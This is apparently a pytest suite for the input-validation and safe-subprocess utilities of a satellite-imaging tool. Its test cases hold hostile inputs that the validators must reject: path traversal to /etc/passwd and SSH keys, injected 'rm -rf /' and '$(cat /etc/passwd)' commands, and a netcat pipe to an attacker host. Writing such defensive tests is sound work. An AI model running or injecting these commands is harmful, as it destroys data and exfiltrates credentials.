"""
Optimized tests for security validation utilities.

This optimized version combines related tests, uses shared fixtures,
and reduces redundant validation operations while maintaining full coverage.
"""

import math
import pathlib
import tempfile
from typing import Any
from unittest.mock import Mock, patch

import pytest

from goesvfi.utils.security import (
    InputValidator,
    SecureFileHandler,
    SecurityError,
    secure_subprocess_call,
)


class OptimizedSecurityTestBase:
    """Base class with shared fixtures and utilities."""

    @pytest.fixture(scope="class")
    def validator(self):
        """Shared validator instance."""
        return InputValidator()

    @pytest.fixture(scope="class")
    def handler(self):
        """Shared secure file handler instance."""
        return SecureFileHandler()


class TestSecurityErrorOptimized(OptimizedSecurityTestBase):
    """Test security error exception."""

    def test_security_error_creation(self) -> None:
        """Test creating security error."""
        error = SecurityError("Security validation failed")
        assert str(error) == "Security validation failed"
        assert isinstance(error, Exception)


class TestInputValidatorOptimized(OptimizedSecurityTestBase):
    """Optimized input validation functionality tests."""

    def test_file_path_validation_combined(self, validator) -> None:
        """Combined test for file path validation scenarios."""
        # Valid paths - test multiple at once
        valid_paths = [
            "/home/user/document.txt",
            "relative/path/file.png",
            "simple_file.jpg",
            "/var/log/app.log",
        ]

        # Batch validate valid paths
        results = [validator.validate_file_path(path) for path in valid_paths]
        assert all(results), "All valid paths should validate successfully"

        # Invalid inputs - test with single assertion block
        invalid_inputs: list[Any] = ["", None, 123, []]
        for invalid_input in invalid_inputs:
            with pytest.raises(SecurityError, match="Path must be a non-empty string"):
                validator.validate_file_path(invalid_input)

        # Directory traversal attempts - batch test
        traversal_attempts = [
            "../../../etc/passwd",
            "safe/../../../etc/shadow",
            "/home/user/../../root/.ssh/id_rsa",
            "..\\..\\windows\\system32\\config\\sam",
        ]

        for attempt in traversal_attempts:
            with pytest.raises(SecurityError, match="directory traversal"):
                validator.validate_file_path(attempt)

    def test_file_path_extensions_and_existence(self, validator) -> None:
        """Combined test for extensions and file existence checks."""
        # Test extensions
        test_cases = [
            ("image.png", [".png", ".jpg"], True, None),
            ("photo.JPG", [".png", ".jpg"], True, None),
            ("document.txt", [".png", ".jpg"], False, "File extension '.txt' not allowed"),
        ]

        for filename, allowed_ext, should_pass, error_msg in test_cases:
            if should_pass:
                assert validator.validate_file_path(filename, allowed_extensions=allowed_ext) is True
            else:
                with pytest.raises(SecurityError, match=error_msg):
                    validator.validate_file_path(filename, allowed_extensions=allowed_ext)

        # Test file existence with temporary file
        with tempfile.NamedTemporaryFile() as temp_file:
            # File exists
            assert validator.validate_file_path(temp_file.name, must_exist=True) is True

        # File doesn't exist
        with pytest.raises(SecurityError, match="File does not exist"):
            validator.validate_file_path("/nonexistent/file.txt", must_exist=True)

        # Test path length limit
        long_path = "a" * 5000
        with pytest.raises(SecurityError, match="Path too long"):
            validator.validate_file_path(long_path)

    def test_numeric_validation_comprehensive(self, validator) -> None:
        """Combined numeric range validation tests."""
        # Valid values - batch test
        valid_cases = [
            (5, 1, 10, "test_value"),
            (1, 1, 10, "lower_boundary"),
            (10, 1, 10, "upper_boundary"),
            (math.pi, 0.0, 5.0, "pi"),
            (0.0, 0.0, 1.0, "zero"),
        ]

        for value, min_val, max_val, name in valid_cases:
            assert validator.validate_numeric_range(value, min_val, max_val, name) is True

        # Invalid types - batch test
        invalid_values: list[Any] = ["5", None, [], {}]
        for invalid_value in invalid_values:
            with pytest.raises(SecurityError, match="must be a number"):
                validator.validate_numeric_range(invalid_value, 1, 10, "test")

        # Out of bounds - test both cases
        with pytest.raises(SecurityError, match="must be between 1 and 10, got 0"):
            validator.validate_numeric_range(0, 1, 10, "too_low")

        with pytest.raises(SecurityError, match="must be between 1 and 10, got 15"):
            validator.validate_numeric_range(15, 1, 10, "too_high")

    def test_filename_sanitization_all_cases(self, validator) -> None:
        """Combined filename sanitization tests."""
        # Test all cases in one method
        test_cases = [
            # Valid names
            ("normal_file.txt", "normal_file.txt"),
            ("file with spaces.jpg", "file with spaces.jpg"),
            ("file123.png", "file123.png"),
            # Dangerous characters
            ("file<>name.txt", "file__name.txt"),
            ('file"name.jpg', "file_name.jpg"),
            ("file|name.png", "file_name.png"),
            ("file?name.gif", "file_name.gif"),
            ("file*name.bmp", "file_name.bmp"),
            ("file\\name.tiff", "file_name.tiff"),
            ("file/name.webp", "file_name.webp"),
            ("file:name.svg", "file_name.svg"),
            # Edge cases
            ("", "untitled"),
            (None, "untitled"),
            ("...", "untitled"),
            ("   ", "untitled"),
            (". . .", "untitled"),
            ("  .file.txt.  ", "file.txt"),
        ]

        for input_name, expected in test_cases:
            result = validator.sanitize_filename(input_name)
            assert result == expected, f"Failed for input: {input_name}"

        # Length limit test
        long_name = "a" * 300 + ".txt"
        result = validator.sanitize_filename(long_name)
        assert len(result) <= 255
        assert result.endswith(".txt")

    def test_ffmpeg_and_sanchez_validation(self, validator) -> None:
        """Combined FFmpeg and Sanchez argument validation."""
        # FFmpeg encoders - batch validate allowed
        allowed_encoders = [
            "Software x265",
            "Software x264",
            "Hardware HEVC (VideoToolbox)",
            "Hardware H.264 (VideoToolbox)",
            "None (copy original)",
        ]

        assert all(validator.validate_ffmpeg_encoder(enc) for enc in allowed_encoders)

        # FFmpeg forbidden encoders
        forbidden_encoders = [
            "malicious_encoder",
            "unknown_codec",
            "; rm -rf /",
            "libx264; cat /etc/passwd",
        ]

        for encoder in forbidden_encoders:
            with pytest.raises(SecurityError, match="not allowed"):
                validator.validate_ffmpeg_encoder(encoder)

        # Sanchez valid arguments - batch test
        valid_sanchez_args = [
            ("res_km", "2.5"),
            ("false_colour", "true"),
            ("false_colour", "false"),
            ("crop", "100,200,300,400"),
            ("timestamp", "2023-12-25T12:00:00Z"),
            ("output", "output_file.png"),
            ("interpolate", "true"),
            ("brightness", "1.2"),
            ("brightness", "-0.5"),
            ("contrast", "1.0"),
            ("saturation", "0.8"),
        ]

        for key, value in valid_sanchez_args:
            assert validator.validate_sanchez_argument(key, value) is True

        # Sanchez invalid arguments
        with pytest.raises(SecurityError, match="not allowed"):
            validator.validate_sanchez_argument("malicious_key", "value")

        invalid_sanchez_args = [
            ("res_km", "not_a_number"),
            ("false_colour", "maybe"),
            ("crop", "invalid_crop"),
            ("timestamp", "invalid_date"),
            ("brightness", "very_bright"),
        ]

        for key, value in invalid_sanchez_args:
            with pytest.raises(SecurityError, match="invalid value"):
                validator.validate_sanchez_argument(key, value)

    def test_command_validation_comprehensive(self, validator) -> None:
        """Combined command argument validation tests."""
        # Safe commands - batch validate
        safe_args = [
            ["ffmpeg", "-i", "input.mp4", "output.mp4"],
            ["convert", "image.jpg", "-resize", "50%", "resized.jpg"],
            ["ls", "-la", "/home/user"],
        ]

        assert all(validator.validate_command_args(args) for args in safe_args)

        # Too many arguments
        too_many_args = ["cmd"] + ["arg"] * 150
        with pytest.raises(SecurityError, match="Too many command arguments"):
            validator.validate_command_args(too_many_args)

        # Dangerous patterns - batch test
        dangerous_args = [
            ["ls", "; rm -rf /"],
            ["cat", "file | nc attacker.com 1234"],
            ["echo", "$(cat /etc/passwd)"],
            ["ls", "&& rm important_file"],
            ["cat", "file`whoami`"],
            ["echo", "\\x41\\x42\\x43"],
            ["curl", "http://example.com/%2e%2e%2fpasswd"],
        ]

        for args in dangerous_args:
            with pytest.raises(SecurityError, match="Dangerous pattern found"):
                validator.validate_command_args(args)

        # Non-string argument
        with pytest.raises(SecurityError, match="must be string"):
            validator.validate_command_args(["ls", 123, "file"])


class TestSecureFileHandlerOptimized(OptimizedSecurityTestBase):
    """Optimized secure file handling tests."""

    def test_secure_file_operations_combined(self, handler) -> None:
        """Combined secure file creation and configuration tests."""
        # Test temp file creation with various options
        test_cases = [
            ({"suffix": ".txt", "prefix": "test_"}, lambda p: p.name.startswith("test_") and p.name.endswith(".txt")),
            ({}, lambda p: p.name.startswith("goesvfi_")),
        ]

        temp_paths = []
        try:
            for kwargs, validator_func in test_cases:
                temp_path = handler.create_secure_temp_file(**kwargs)
                temp_paths.append(temp_path)

                assert temp_path.exists()
                assert validator_func(temp_path)

                # Check permissions (owner read/write only)
                stat_info = temp_path.stat()
                assert stat_info.st_mode & 0o777 == 0o600
        finally:
            # Cleanup
            for path in temp_paths:
                if path.exists():
                    path.unlink()

    @patch("pathlib.Path.mkdir")
    @patch("pathlib.Path.chmod")
    def test_secure_config_dir(self, mock_chmod, mock_mkdir, handler) -> None:
        """Test creation of secure configuration directory."""
        config_dir = pathlib.Path("/test/config")
        handler.create_secure_config_dir(config_dir)

        mock_mkdir.assert_called_once_with(parents=True, exist_ok=True)
        mock_chmod.assert_called_once_with(0o700)


class TestSecureSubprocessCallOptimized(OptimizedSecurityTestBase):
    """Optimized secure subprocess execution tests."""

    @patch("subprocess.run")
    def test_subprocess_execution_scenarios(self, mock_run) -> None:
        """Combined subprocess execution tests."""
        # Success case
        mock_result = Mock()
        mock_run.return_value = mock_result

        command = ["ls", "-la", "/home/user"]
        result = secure_subprocess_call(command)

        assert result == mock_result
        mock_run.assert_called_with(
            command,
            shell=False,
            check=True,
            capture_output=True,
            text=True,
            timeout=300,
        )

        # Custom timeout
        mock_run.reset_mock()
        command = ["sleep", "10"]
        secure_subprocess_call(command, timeout=60)
        mock_run.assert_called_with(command, shell=False, check=True, capture_output=True, text=True, timeout=60)

        # Shell execution not allowed
        with pytest.raises(SecurityError, match="Shell execution not allowed"):
            secure_subprocess_call(["ls", "/"], shell=True)

    def test_dangerous_command_rejection(self) -> None:
        """Test rejection of dangerous commands."""
        dangerous_commands = [
            ["ls", "; rm -rf /"],
            ["echo", "$(cat /etc/passwd)"],
            ["cat", "file | nc attacker.com 1234"],
        ]

        for command in dangerous_commands:
            with pytest.raises(SecurityError, match="Dangerous pattern found"):
                secure_subprocess_call(command)

    @patch("subprocess.run")
    def test_subprocess_error_handling(self, mock_run) -> None:
        """Combined subprocess error handling tests."""
        import subprocess

        # Timeout error
        mock_run.side_effect = subprocess.TimeoutExpired("cmd", 30)
        with pytest.raises(SecurityError, match="Command timed out after 30 seconds"):
            secure_subprocess_call(["sleep", "60"], timeout=30)

        # Other exceptions
        mock_run.side_effect = OSError("Permission denied")
        with pytest.raises(OSError, match="Permission denied"):
            secure_subprocess_call(["restricted_command"])


class TestSecurityIntegrationOptimized(OptimizedSecurityTestBase):
    """Optimized integration tests for security functionality."""

    def test_complete_security_workflow(self, validator, handler) -> None:
        """Test complete security validation workflow with all components."""
        # Simulate processing user-provided parameters
        user_inputs = {
            "input_file": "user_image.png",
            "output_file": "processed<>image.jpg",
            "quality": 90,
            "encoder": "Software x265",
            "sanchez_res": "2.0",
            "command_args": ["convert", "input.png", "output.jpg"],
        }

        # Batch validate all inputs
        validated_inputs = {}

        # File validations
        assert (
            validator.validate_file_path(
                user_inputs["input_file"], allowed_extensions=validator.ALLOWED_IMAGE_EXTENSIONS
            )
            is True
        )
        validated_inputs["input_file"] = user_inputs["input_file"]

        # Sanitize and validate
        validated_inputs["output_file"] = validator.sanitize_filename(user_inputs["output_file"])
        assert validated_inputs["output_file"] == "processed__image.jpg"

        # Numeric, encoder, and command validations
        assert validator.validate_numeric_range(user_inputs["quality"], 1, 100, "quality") is True
        assert validator.validate_ffmpeg_encoder(user_inputs["encoder"]) is True
        assert validator.validate_sanchez_argument("res_km", user_inputs["sanchez_res"]) is True
        assert validator.validate_command_args(user_inputs["command_args"]) is True

        validated_inputs.update({
            "quality": user_inputs["quality"],
            "encoder": user_inputs["encoder"],
            "sanchez_res": user_inputs["sanchez_res"],
            "command_args": user_inputs["command_args"],
        })

        # Create secure temp file for processing
        temp_file = handler.create_secure_temp_file(suffix=".test")
        try:
            assert temp_file.exists()
            stat_info = temp_file.stat()
            assert stat_info.st_mode & 0o777 == 0o600

            # Test writing
            temp_file.write_text("test content")
            assert temp_file.read_text() == "test content"
        finally:
            if temp_file.exists():
                temp_file.unlink()

        # Verify all inputs validated
        assert len(validated_inputs) == len(user_inputs)
        assert all(key in validated_inputs for key in user_inputs)

    def test_attack_prevention_comprehensive(self, validator) -> None:
        """Test prevention of various attack scenarios in one comprehensive test."""
        attack_scenarios = [
            # Path traversal
            (lambda: validator.validate_file_path("../../../etc/passwd"), SecurityError),
            # Command injection via FFmpeg
            (lambda: validator.validate_ffmpeg_encoder("libx264; rm -rf /"), SecurityError),
            # Command injection via Sanchez
            (lambda: validator.validate_sanchez_argument("output", "file.png; cat /etc/passwd"), SecurityError),
            # Command injection via subprocess
            (lambda: validator.validate_command_args(["convert", "image.jpg", "; rm important_file"]), SecurityError),
        ]

        for attack_func, expected_error in attack_scenarios:
            with pytest.raises(expected_error):
                attack_func()
